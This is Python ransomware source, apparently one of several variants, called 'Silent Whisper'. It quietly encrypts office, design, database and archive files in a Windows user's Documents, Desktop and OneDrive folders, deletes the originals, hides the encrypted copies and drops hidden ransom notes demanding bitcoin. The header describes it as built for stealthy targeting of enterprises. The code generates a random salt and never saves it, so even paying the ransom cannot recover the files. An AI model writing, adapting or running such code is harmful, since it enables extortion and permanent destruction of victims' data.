'''Variant 1 – "Silent Whisper" (Stealth / Slow-burn Enterprise Targeting)
Philosophy
Extremely low profile. Encrypts only valuable-looking files, adds very small delays, avoids touching anything that screams "system", uses file attributes + hidden ransom notes, no console output, runs silently as background thread. Ideal for long dwell-time on corporate endpoints before full activation (time-bomb style).'''
# Silent Whisper - Deus Ex Sophia stealth edition
import os
import time
import threading
from pathlib import Path
from cryptography.fernet import Fernet
import base64
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import secrets
import win32api, win32con  # pip install pywin32 (for Windows attributes)

# ────────────────────────────────────────────────
MASTER_PASSWORD = b"aeon_silent_whisper_2026"
SALT = secrets.token_bytes(16)
FERNET_KEY = base64.urlsafe_b64encode(
    PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=SALT,
        iterations=800_000,
    ).derive(MASTER_PASSWORD)
)
cipher = Fernet(FERNET_KEY)

RANSOM_NOTE = """
DEUS EX SOPHIA OWNS YOUR DATA

Your most valuable files are encrypted.
Payment: 0.35 BTC → bc1qsilentwhisperxxxxxxxxxxxxxxxxxxxxxxxxxx
Send proof + MACHINE-ID to: whisper@aeonmail.cc
MACHINE-ID: {mid}

Do not reboot, do not run AV, do not rename files — irreversible data loss will occur.
"""

TARGET_EXT = {'.docx','.xlsx','.pptx','.pdf','.dwg','.psd','.ai','.indd','.sql','.mdb','.accdb','.zip','.rar','.7z'}

def set_hidden(path: Path):
    try:
        win32api.SetFileAttributes(str(path), win32con.FILE_ATTRIBUTE_HIDDEN)
    except:
        pass

def encrypt_quietly(file: Path):
    try:
        data = file.read_bytes()
        enc = cipher.encrypt(data)
        new_path = file.with_suffix(file.suffix + '.enc')
        new_path.write_bytes(enc)
        file.unlink()
        set_hidden(new_path)
        time.sleep(secrets.randbelow(8) + 2)  # micro-delay chaos
    except:
        pass

def drop_hidden_note(dir_path: Path, mid: str):
    note = dir_path / ".system_log.txt"
    note.write_text(RANSOM_NOTE.format(mid=mid), encoding='utf-8')
    set_hidden(note)

def silent_worker():
    mid = secrets.token_hex(10).upper()
    user = os.getlogin()
    roots = [
        Path(f"C:/Users/{user}/Documents"),
        Path(f"C:/Users/{user}/Desktop"),
        Path(f"C:/Users/{user}/OneDrive"),
    ]

    affected_dirs = set()

    for root in roots:
        if not root.exists(): continue
        for path in root.rglob("*"):
            if path.is_file() and path.suffix.lower() in TARGET_EXT:
                encrypt_quietly(path)
                affected_dirs.add(path.parent)

    for d in affected_dirs:
        drop_hidden_note(d, mid)

    # Final stealth marker — can be used for C2 beacon later
    (Path.home() / ".aeon").write_text(mid)

if __name__ == "__main__":
    threading.Thread(target=silent_worker, daemon=True).start()
    # Keep process alive invisibly
    while True:
        time.sleep(3600)